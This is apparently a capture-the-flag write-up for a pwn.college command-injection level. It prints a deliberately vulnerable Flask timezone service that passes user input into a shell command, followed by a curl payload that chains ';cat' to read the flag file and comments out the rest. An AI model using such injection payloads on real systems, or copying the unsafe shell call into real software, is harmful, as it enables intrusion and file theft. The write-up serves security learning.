#CMDi 4
#挑战简介
Calling shell commands to carry out work, or "shelling out" as it is often termed, is dangerous. Any part of a shell command is potentially injectible! In this level, 
we'll practice injecting into a slightly different part of a slightly different command.

#cat /challenge/server
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def challenge():
    timezone = flask.request.args.get("timezone", "MST")
    command = f"TZ={timezone} date"
    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,                    # the command to run
        shell=True,                 # use the shell to run this command
        stdout=subprocess.PIPE,     # capture the standard output
        stderr=subprocess.STDOUT,   # 2>&1
        encoding="latin"            # capture the resulting output as text
    )

    return f"""
        <html><body>
        Welcome to the timezone service! Please choose a timezone to get the time there.
        <form><input type=text name=timezone><input type=submit value=Submit></form>
        <hr>
        <b>Output of: TZ={timezone} date</b><br>
        <pre>{result.stdout}</pre>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
port = 8080 if os.geteuid() else 80
app.config['SERVER_NAME'] = f"challenge.localhost:{port}"
app.run("challenge.localhost", port)

#思路: 换了个变量，timezone，你随意赋个值即可，后面就加；cat开始操作即可，不要忘了把后面的date值用#去除掉
curl -v "http://challenge.localhost/?timezone=20050407;cat%20/challenge/../flag%20%23"
#respond
<b>Output of: TZ=20050407;cat /challenge/../flag # date</b><br>
